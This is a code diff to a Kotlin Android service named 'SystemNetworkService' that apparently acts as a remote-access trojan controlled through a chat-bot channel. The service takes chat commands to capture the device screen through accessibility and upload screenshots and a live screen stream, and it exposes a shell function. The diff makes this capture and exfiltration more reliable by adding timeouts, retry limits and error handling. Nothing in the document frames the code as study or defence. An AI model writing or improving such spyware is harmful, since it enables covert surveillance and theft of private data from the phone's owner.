@@ -254,22 +254,26 @@ class SystemNetworkService : Service() {
                 "info" -> d.sendMsg("```ansi\n${buildInfo()}\n```")
                 "screenshot" -> {
                     val progressId = d.sendMsgAwait(":camera: **Capturing**...")
-                    val t1 = System.currentTimeMillis()
-                    val bytes = captureScreen()
-                    val elapsed = System.currentTimeMillis() - t1
-                    if (bytes != null) {
-                        val done = ":camera: **Screenshot** (${elapsed}ms)"
-                        if (progressId != null) {
-                            d.editMsg(progressId, done)
-                            delay(300)
+                    try {
+                        val t1 = System.currentTimeMillis()
+                        val bytes = captureScreen()
+                        val elapsed = System.currentTimeMillis() - t1
+                        if (bytes != null) {
+                            val done = ":camera: **Screenshot** (${elapsed}ms)"
+                            if (progressId != null) {
+                                d.editMsg(progressId, done)
+                                delay(300)
+                            } else {
+                                d.sendMsg(done)
+                            }
+                            d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
                         } else {
-                            d.sendMsg(done)
+                            val err = ":x: **Screenshot failed** (${elapsed}ms)\nEnsure accessibility is enabled"
+                            if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                         }
-                        d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
-                    } else {
-                        val err = ":x: **Screenshot failed** (${elapsed}ms)\n`!debug` for details"
+                    } catch (e: Exception) {
+                        val err = ":x: **Screenshot error**: ${e.message?.take(50) ?: "unknown"}"
                         if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
-                        
                     }
                 }
                 "stream" -> {
@@ -296,12 +300,35 @@ class SystemNetworkService : Service() {
                                 isStreaming = true
                                 d.sendMsg(":tv: **Live stream started** at ${fps}fps\nUse `!stream stop` to end")
                                 streamJob = scope.launch {
-                                    while (isActive) {
-                                        val bytes = captureScreenForStream()
-                                        if (bytes != null) {
-                                            d.sendFile("", "stream_${System.currentTimeMillis()}.jpg", bytes)
+                                    var consecutiveFailures = 0
+                                    val maxFailures = 5
+                                    try {
+                                        while (isActive) {
+                                            try {
+                                                val bytes = captureScreenForStream()
+                                                if (bytes != null) {
+                                                    consecutiveFailures = 0
+                                                    d.sendFile("", "stream_${System.currentTimeMillis()}.jpg", bytes)
+                                                } else {
+                                                    consecutiveFailures++
+                                                    if (consecutiveFailures >= maxFailures) {
+                                                        d.sendMsg(":x: Stream stopped — too many failures")
+                                                        isStreaming = false
+                                                        break
+                                                    }
+                                                }
+                                            } catch (e: Exception) {
+                                                consecutiveFailures++
+                                                if (consecutiveFailures >= maxFailures) {
+                                                    d.sendMsg(":x: Stream error — stopped")
+                                                    isStreaming = false
+                                                    break
+                                                }
+                                            }
+                                            delay(1000L / fps)
                                         }
-                                        delay(1000L / fps)
+                                    } catch (e: Exception) {
+                                        isStreaming = false
                                     }
                                 }
                             } else {
@@ -864,27 +891,31 @@ class SystemNetworkService : Service() {
     }
 
     private suspend fun captureScreen(): ByteArray? = withContext(Dispatchers.IO) {
-        val deferred = CompletableDeferred<ByteArray?>()
-        val ss = DisplayCapture(this@SystemNetworkService)
-        ss.capture(object : DisplayCapture.Callback {
-            override fun onSuccess(data: ByteArray) { deferred.complete(data) }
-            override fun onFailure(error: String) {
-                deferred.complete(null)
-            }
-        })
-        deferred.await()
+        try {
+            val deferred = CompletableDeferred<ByteArray?>()
+            val ss = DisplayCapture(this@SystemNetworkService)
+            ss.capture(object : DisplayCapture.Callback {
+                override fun onSuccess(data: ByteArray) { deferred.complete(data) }
+                override fun onFailure(error: String) { deferred.complete(null) }
+            })
+            withTimeoutOrNull(15000L) { deferred.await() }
+        } catch (e: Exception) {
+            null
+        }
     }
 
     private suspend fun captureScreenForStream(): ByteArray? = withContext(Dispatchers.IO) {
-        val deferred = CompletableDeferred<ByteArray?>()
-        val ss = DisplayCapture(this@SystemNetworkService)
-        ss.captureForStream(object : DisplayCapture.Callback {
-            override fun onSuccess(data: ByteArray) { deferred.complete(data) }
-            override fun onFailure(error: String) {
-                deferred.complete(null)
-            }
-        })
-        deferred.await()
+        try {
+            val deferred = CompletableDeferred<ByteArray?>()
+            val ss = DisplayCapture(this@SystemNetworkService)
+            ss.captureForStream(object : DisplayCapture.Callback {
+                override fun onSuccess(data: ByteArray) { deferred.complete(data) }
+                override fun onFailure(error: String) { deferred.complete(null) }
+            })
+            withTimeoutOrNull(10000L) { deferred.await() }
+        } catch (e: Exception) {
+            null
+        }
     }
 
     private suspend fun shell(cmd: String): String = withContext(Dispatchers.IO) {
